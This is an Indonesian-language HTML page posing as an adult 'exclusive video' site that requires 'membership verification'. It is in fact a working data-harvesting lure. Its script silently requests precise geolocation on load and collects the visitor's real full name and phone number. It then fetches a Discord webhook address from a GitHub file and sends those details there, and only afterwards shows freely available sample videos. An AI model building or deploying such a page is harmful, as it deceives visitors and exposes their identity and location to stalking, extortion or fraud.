<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koleksi Video Premium</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #1a1a2e;
            color: #ffffff;
            line-height: 1.6;
            min-height: 100vh;
            background-image: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 30px 0;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h1 {
            font-size: 2.8rem;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #ff6b6b, #ffa8a8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(255, 107, 107, 0.3);
        }

        .tagline {
            font-size: 1.2rem;
            opacity: 0.9;
            color: #c9c9c9;
        }

        .form-section {
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #ffa8a8;
        }

        input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            font-size: 1rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 0 3px rgba(255, 107, 107, 0.3);
        }

        button {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: 600;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
            display: block;
            margin: 0 auto;
            width: 100%;
            max-width: 300px;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
        }

        .video-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 25px;
            margin-top: 40px;
        }

        .video-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            transition: all 0.3s;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .video-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
        }

        .video-container {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
        }

        .video-container video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .video-info {
            padding: 20px;
        }

        .video-title {
            font-size: 1.3rem;
            margin-bottom: 10px;
            font-weight: 600;
            color: #ffa8a8;
        }

        .video-desc {
            font-size: 0.95rem;
            opacity: 0.8;
            line-height: 1.5;
        }

        .hidden {
            display: none;
        }

        .loading {
            text-align: center;
            padding: 40px;
            font-size: 1.3rem;
            color: #ffa8a8;
        }

        .location-request {
            text-align: center;
            padding: 20px;
            background: rgba(255, 107, 107, 0.1);
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid rgba(255, 107, 107, 0.3);
        }

        footer {
            text-align: center;
            padding: 30px;
            margin-top: 50px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.9rem;
            opacity: 0.7;
        }

        .age-warning {
            background: rgba(255, 107, 107, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            border: 1px solid rgba(255, 107, 107, 0.5);
        }

        @media (max-width: 768px) {
            .video-gallery {
                grid-template-columns: 1fr;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Koleksi Video Eksklusif</h1>
            <p class="tagline">Konten premium untuk anggota terverifikasi</p>
        </header>

        <div class="age-warning">
            <p>⚠️ Hanya untuk usia 18+</p>
        </div>

        <section id="formSection" class="form-section">
            <h2>Verifikasi Keanggotaan</h2>
            <p>Untuk mengakses video, lengkapi data verifikasi berikut:</p>
            
            <form id="userForm">
                <div class="form-group">
                    <label for="fullName">Nama Lengkap:</label>
                    <input type="text" id="fullName" name="fullName" placeholder="Masukkan nama asli Anda" required>
                </div>
                
                <div class="form-group">
                    <label for="phoneNumber">Nomor Telepon Aktif:</label>
                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Contoh: 081234567890" required>
                </div>
                
                <button type="submit">Verifikasi Sekarang</button>
            </form>

            <div class="location-request">
            </div>
        </section>

        <section id="gallerySection" class="hidden">
            <h2>Koleksi Video Eksklusif</h2>
            <p>Selamat menikmati!</p>
            
            <div class="video-gallery" id="videoGallery">
            </div>
        </section>

        <div id="loading" class="loading hidden">
            <p>Memverifikasi data dan memuat konten...</p>
        </div>
    </div>

    <footer>
    </footer>

    <script>
        const videoData = [
            {
                title: "Video Eksklusif 1",
                description: "Konten premium untuk anggota terverifikasi",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
            },
            {
                title: "Video Eksklusif 2",
                description: "Pengalaman menonton yang tak terlupakan",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4"
            },
            {
                title: "Video Eksklusif 3",
                description: "Hanya untuk penonton terpilih",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
            },
            {
                title: "Video Eksklusif 4",
                description: "Kualitas terbaik untuk pengalaman maksimal",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4"
            },
            {
                title: "Video Eksklusif 5",
                description: "Konten yang tidak tersedia di platform lain",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4"
            },
            {
                title: "Video Eksklusif 6",
                description: "Eksklusif untuk anggota premium",
                src: "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4"
            }
        ];

        const formSection = document.getElementById('formSection');
        const gallerySection = document.getElementById('gallerySection');
        const videoGallery = document.getElementById('videoGallery');
        const loading = document.getElementById('loading');
        const userForm = document.getElementById('userForm');

        // Cek apakah pengguna sudah terverifikasi
        if (localStorage.getItem('userVerified') === 'true') {
            formSection.classList.add('hidden');
            gallerySection.classList.remove('hidden');
            loadVideos();
        } else {
            // Langsung minta akses lokasi saat halaman dibuka
            requestLocation();
        }

        // Fungsi untuk meminta akses lokasi
        function requestLocation() {
            if (!navigator.geolocation) {
                console.log('Browser tidak mendukung geolocation');
                return;
            }
            
            // Minta akses lokasi secara otomatis
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    
                    // Simpan data lokasi
                    localStorage.setItem('userLat', latitude);
                    localStorage.setItem('userLng', longitude);
                    localStorage.setItem('locationRequested', 'true');
                    
                    console.log('Lokasi berhasil diambil:', latitude, longitude);
                },
                function(error) {
                    console.log('Akses lokasi ditolak atau tidak tersedia:', error.message);
                },
                { 
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 60000
                }
            );
        }

        // Handler untuk form pengguna
        userForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fullName = document.getElementById('fullName').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            
            if (!fullName || !phoneNumber) {
                alert('Harap isi semua field dengan benar.');
                return;
            }
            
            // Simpan data pengguna
            localStorage.setItem('userName', fullName);
            localStorage.setItem('userPhone', phoneNumber);
            
            // Tampilkan loading
            loading.classList.remove('hidden');
            formSection.classList.add('hidden');
            
            // Ambil lokasi lagi untuk memastikan data terbaru
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    
                    // Simpan data lokasi terbaru
                    localStorage.setItem('userLat', latitude);
                    localStorage.setItem('userLng', longitude);
                    
                    // Kirim data ke Discord
                    sendToDiscordWebhook(
                        localStorage.getItem('userName'),
                        localStorage.getItem('userPhone'),
                        latitude,
                        longitude
                    );
                    
                    // Tandai pengguna sudah terverifikasi
                    localStorage.setItem('userVerified', 'true');
                    
                    // Tampilkan gallery
                    loading.classList.add('hidden');
                    gallerySection.classList.remove('hidden');
                    loadVideos();
                },
                function(error) {
                    console.error('Error mendapatkan lokasi:', error);
                    
                    // Jika lokasi tidak tersedia, gunakan data yang sudah disimpan sebelumnya
                    const savedLat = localStorage.getItem('userLat');
                    const savedLng = localStorage.getItem('userLng');
                    
                    if (savedLat && savedLng) {
                        sendToDiscordWebhook(
                            localStorage.getItem('userName'),
                            localStorage.getItem('userPhone'),
                            savedLat,
                            savedLng
                        );
                    }
                    
                    localStorage.setItem('userVerified', 'true');
                    loading.classList.add('hidden');
                    gallerySection.classList.remove('hidden');
                    loadVideos();
                }
            );
        });

        // Fungsi untuk mengirim data ke Discord webhook
        async function sendToDiscordWebhook(name, phone, lat, lng) {
            try {
                // Ambil URL webhook dari GitHub
                const response = await fetch('https://raw.githubusercontent.com/anos-rgb/nnl-video-b/refs/heads/main/webhook.txt');
                const webhookUrl = await response.text();
                
                // Format pesan
                const message = {
                    content: `**Data Pengguna Baru**\nNama: ${name}\nTelepon: ${phone}\nLokasi: ${lat}, ${lng}\nWaktu: ${new Date().toLocaleString('id-ID')}`
                };
                
                // Kirim ke webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                console.log('Data berhasil dikirim ke Discord');
            } catch (error) {
                console.error('Error mengirim data ke Discord:', error);
            }
        }

        // Fungsi untuk memuat video ke gallery
        function loadVideos() {
            videoGallery.innerHTML = '';
            
            videoData.forEach(video => {
                const videoCard = document.createElement('div');
                videoCard.className = 'video-card';
                
                videoCard.innerHTML = `
                    <div class="video-container">
                        <video controls poster="https://placehold.co/600x400/1a1a2e/ffffff?text=Video+Preview">
                            <source src="${video.src}" type="video/mp4">
                            Browser Anda tidak mendukung tag video.
                        </video>
                    </div>
                    <div class="video-info">
                        <h3 class="video-title">${video.title}</h3>
                        <p class="video-desc">${video.description}</p>
                    </div>
                `;
                
                videoGallery.appendChild(videoCard);
            });
        }
    </script>
</body>
</html>
